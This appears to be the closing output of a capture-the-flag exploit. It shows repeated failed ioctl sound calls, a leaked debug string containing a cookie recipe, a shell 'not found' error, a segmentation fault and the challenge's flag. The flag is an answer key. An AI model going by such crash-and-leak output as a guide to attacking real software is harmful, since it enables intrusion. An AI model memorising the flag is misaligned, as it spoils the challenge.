failed.ioctl(4, KIOCSOUND, 1079) failed.ioctl(4, KIOCSOUND, 1080) failed.ioctl(4, KIOCSOUND, 1081) failed.ioctl(4, KIOCSOUND, 1082) failed.ioctl(4, KIOCSOUND, 1083) failed.ioctl(4, KIOCSOUND, 1084) failed.ioctl(4, KIOCSOUND, 1085) failed.ioctl(4, KIOCSOUND, 1086) failed.ioctl(4, KIOCSOUND, 1087) failed.ioctl(4, KIOCSOUND, 1088) failed.ioctl(4, KIOCSOUND, 1089) failed.ioctl(4, KIOCSOUND, 1090) failed.ioctl(4, KIOCSOUND, 1091) failed.ioctl(4, KIOCSOUND, 1092) failed.ioctl(4, KIOCSOUND, 1093) failed.ioctl(4, KIOCSOUND, 1094) failed.ioctl(4, KIOCSOUND, 1095) failed.ioctl(4, KIOCSOUND, 1096) failed.ioctl(4, KIOCSOUND, 1097) failed.ioctl(4, KIOCSOUND, 1098) failed.ioctl(4, KIOCSOUND, 1099) failed.ioctl(4, KIOCSOUND, 1100) failed.ioctl(4, KIOCSOUND, 1101) failed.ioctl(4, KIOCSOUND, 1102) failed.ioctl(4, KIOCSOUND, 1103) failed.ioctl(4, KIOCSOUND, 1104) failed.ioctl(4, KIOCSOUND, 1105) failed.ioctl(4, KIOCSOUND, 1106) failed.ioctl(4, KIOCSOUND, 1107) failed.ioctl(4, KIOCSOUND, 1108) failed.ioctl(4, KIOCSOUND, 1109) failed.ioctl(4, KIOCSOUND, 1110) failed.ioctl(4, KIOCSOUND, 1111) failed.ioctl(4, KIOCSOUND, 1112) failed.ioctl(4, KIOCSOUND, 1113) failed.ioctl(4, KIOCSOUND, 1114) failed.ioctl(4, KIOCSOUND, 1115) failed.ioctl(4, KIOCSOUND, 1116) failed.ioctl(4, KIOCSOUND, 1117) failed.ioctl(4, KIOCSOUND, 1118) failed.ioctl(4, KIOCSOUND, 1119) failed.ioctl(4, KIOCSOUND, 1120) failed.ioctl(4, KIOCSOUND, 1121) failed.ioctl(4, KIOCSOUND, 1122) failed.ioctl(4, KIOCSOUND, 1123) failed.ioctl(4, KIOCSOUND, 1124) failed.ioctl(4, KIOCSOUND, 1125) failed.ioctl(4, KIOCSOUND, 1126) failed.ioctl(4, KIOCSOUND, 1127) failed.ioctl(4, KIOCSOUND, 1128) failed.ioctl(4, KIOCSOUND, 1129) failed.ioctl(4, KIOCSOUND, 1130) failed.ioctl(4, KIOCSOUND, 1131) failed.ioctl(4, KIOCSOUND, 1132) failed.ioctl(4, KIOCSOUND, 1133) failed.ioctl(4, KIOCSOUND, 1134) failed.ioctl(4, KIOCSOUND, 1135) failed.ioctl(4, KIOCSOUND, 1136) failed.ioctl(4, KIOCSOUND, 1137) failed.ioctl(4, KIOCSOUND, 1138) failed.ioctl(4, KIOCSOUND, 1139) failed.ioctl(4, KIOCSOUND, 1140) failed.ioctl(4, KIOCSOUND, 1141) failed.ioctl(4, KIOCSOUND, 1142) failed.ioctl(4, KIOCSOUND, 1143) failed.ioctl(4, KIOCSOUND, 1144) failed.ioctl(4, KIOCSOUND, 1145) failed.ioctl(4, KIOCSOUND, 1146) failed.ioctl(4, KIOCSOUND, 1147) failed.ioctl(ioctl(4, KIOCSOUND, 0) failed.debug_data: "== Secret recipe for the CTF{the_cake_wasnt_a_lie} cake ==

The Pittsburgh Engineer’s Cake (This is the maximum of the final Gaussian Process model, trained
on all the Pittsburgh Trials, including transfer learning.)

    Mix together flour, baking soda, and cayenne pepper. Then, mix the sugar, egg, butter (near refrigerator
temperature), and other ingredients until nearly smooth; it takes about 2 minutes in a counter-top stand mixer
with a flat paddle blade. Add the dry ingredients and mix just until the dough is uniform; do not over-mix. Spoon
out onto parchment paper (we used a #40 scoop, 24 milliliters), and bake for 14 minutes at 175C (350◦
F).

• 167 grams of all-purpose flour.
• 186 grams of dark chocolate chips.
• 1/2 tsp. baking soda.
• 1/4 tsp. salt.
• 1/4 tsp. cayenne pepper.
• 262 grams of sugar (75% medium brown, 25% white).
• 30 grams of egg.
• 132 grams of butter.
• 3/8 tsp. orange extract.
• 1/2 tsp. vanilla extract.

https://research.google.com/pubs/archive/46507.pdf

Th"sh: 1: Fɹ3,V: not found
Segmentation fault (core dumped)
```

The flag: CTF{the_cake_wasnt_a_lie}